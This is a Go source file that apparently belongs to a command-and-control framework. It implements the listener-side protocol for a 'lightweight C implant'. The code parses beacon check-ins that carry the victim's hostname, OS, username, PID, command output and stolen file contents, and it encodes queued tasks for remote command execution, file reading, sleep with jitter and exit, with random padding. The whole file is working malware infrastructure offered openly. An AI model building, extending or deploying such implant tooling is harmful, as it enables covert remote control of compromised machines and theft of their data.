// Package litebeacon implements the lightweight C implant listener: a TLS
// endpoint that accepts TLV payloads sealed with a per-build AES-GCM key.
package litebeacon

import (
	"encoding/binary"
	"errors"
	"fmt"
)

// Wire TLV type codes — shared with implant/lite/main.c.
const (
	tlvBeaconID  byte = 0x01
	tlvTimestamp byte = 0x02
	tlvPad       byte = 0x0f
	tlvHostname  byte = 0x10
	tlvOS        byte = 0x11
	tlvArch      byte = 0x12
	tlvUsername  byte = 0x13
	tlvPID       byte = 0x14
	tlvExecRes   byte = 0x20
	tlvFileRes   byte = 0x30
)

// Task types queued by the console.
const (
	TaskExec  byte = 0x40
	TaskRead  byte = 0x41
	TaskSleep byte = 0x42
	TaskExit  byte = 0x43
)

// maxTLVValueSize bounds a single TLV value: 512KiB file content + framing.
const maxTLVValueSize = 768 * 1024

type tlv struct {
	Type  byte
	Value []byte
}

func encodeTLVs(items []tlv) []byte {
	size := 0
	for _, it := range items {
		size += 3 + len(it.Value)
	}
	buf := make([]byte, 0, size)
	var lenb [2]byte
	for _, it := range items {
		binary.LittleEndian.PutUint16(lenb[:], uint16(len(it.Value)))
		buf = append(buf, it.Type, lenb[0], lenb[1])
		buf = append(buf, it.Value...)
	}
	return buf
}

func decodeTLVs(data []byte) ([]tlv, error) {
	var items []tlv
	for len(data) > 0 {
		if len(data) < 3 {
			return nil, errors.New("truncated tlv header")
		}
		n := int(binary.LittleEndian.Uint16(data[1:3]))
		if n > maxTLVValueSize {
			return nil, fmt.Errorf("oversized tlv value for type %#x", data[0])
		}
		if len(data) < 3+n {
			return nil, errors.New("truncated tlv value")
		}
		items = append(items, tlv{Type: data[0], Value: data[3 : 3+n]})
		data = data[3+n:]
	}
	return items, nil
}

// BeaconInfo is the host snapshot sent on the first check-in.
type BeaconInfo struct {
	ID       string `json:"ID"`
	Hostname string `json:"Hostname"`
	OS       string `json:"OS"`
	Arch     string `json:"Arch"`
	Username string `json:"Username"`
	PID      uint32 `json:"PID"`
}

type ExecResult struct {
	TaskID uint32
	Exit   int32
	Output []byte
}

type FileResult struct {
	TaskID  uint32
	Err     uint8
	Content []byte
}

type checkin struct {
	BeaconID string
	TS       uint64
	Info     *BeaconInfo // nil unless hello fields present
	Execs    []ExecResult
	Files    []FileResult
}

// Task is a queued console action, delivered on the next check-in.
type Task struct {
	ID          uint32
	Type        byte // TaskExec / TaskRead / TaskSleep / TaskExit
	Cmd         string
	Path        string
	TimeoutSec  uint16
	IntervalSec uint32
	JitterPct   uint8
}

// parseCheckin decodes a decrypted implant request payload.
func parseCheckin(plain []byte) (*checkin, error) {
	items, err := decodeTLVs(plain)
	if err != nil {
		return nil, err
	}
	ci := &checkin{}
	info := &BeaconInfo{}
	for _, it := range items {
		switch it.Type {
		case tlvBeaconID:
			ci.BeaconID = string(it.Value)
		case tlvTimestamp:
			if len(it.Value) != 8 {
				return nil, errors.New("bad timestamp")
			}
			ci.TS = binary.LittleEndian.Uint64(it.Value)
		case tlvHostname:
			info.Hostname = string(it.Value)
		case tlvOS:
			info.OS = string(it.Value)
		case tlvArch:
			info.Arch = string(it.Value)
		case tlvUsername:
			info.Username = string(it.Value)
		case tlvPID:
			if len(it.Value) != 4 {
				return nil, errors.New("bad pid")
			}
			info.PID = binary.LittleEndian.Uint32(it.Value)
		case tlvExecRes:
			if len(it.Value) < 8 {
				return nil, errors.New("bad exec result")
			}
			ci.Execs = append(ci.Execs, ExecResult{
				TaskID: binary.LittleEndian.Uint32(it.Value[0:4]),
				Exit:   int32(binary.LittleEndian.Uint32(it.Value[4:8])),
				Output: cloneBytes(it.Value[8:]),
			})
		case tlvFileRes:
			if len(it.Value) < 5 {
				return nil, errors.New("bad file result")
			}
			ci.Files = append(ci.Files, FileResult{
				TaskID:  binary.LittleEndian.Uint32(it.Value[0:4]),
				Err:     it.Value[4],
				Content: cloneBytes(it.Value[5:]),
			})
		case tlvPad:
			// padding, ignored
		default:
			// unknown types are ignored for forward compatibility
		}
	}
	if ci.BeaconID == "" || ci.TS == 0 {
		return nil, errors.New("missing beacon id or timestamp")
	}
	if info.Hostname != "" || info.OS != "" || info.Arch != "" || info.Username != "" || info.PID != 0 {
		ci.Info = info
	}
	return ci, nil
}

// buildTaskPayload encodes pending tasks plus a random padding TLV.
func buildTaskPayload(tasks []Task, padLen int) ([]byte, error) {
	items := make([]tlv, 0, len(tasks)+1)
	for _, t := range tasks {
		value := make([]byte, 0, 10+len(t.Cmd)+len(t.Path))
		switch t.Type {
		case TaskExec:
			// Wire layout must match implant/lite/main.c run_tasks():
			// [task_id:4][timeout:2][cmd]. Only exec/read carry the task
			// ID — sleep/exit produce no result, so no ID on the wire.
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = binary.LittleEndian.AppendUint16(value, t.TimeoutSec)
			value = append(value, t.Cmd...)
		case TaskRead:
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = append(value, t.Path...)
		case TaskSleep:
			value = binary.LittleEndian.AppendUint32(value, t.IntervalSec)
			value = append(value, t.JitterPct)
		case TaskExit:
		default:
			return nil, fmt.Errorf("unknown task type %#x", t.Type)
		}
		items = append(items, tlv{Type: t.Type, Value: value})
	}
	if padLen > 0 {
		items = append(items, tlv{Type: tlvPad, Value: randomBytes(padLen)})
	}
	return encodeTLVs(items), nil
}

func cloneBytes(b []byte) []byte {
	out := make([]byte, len(b))
	copy(out, b)
	return out
}
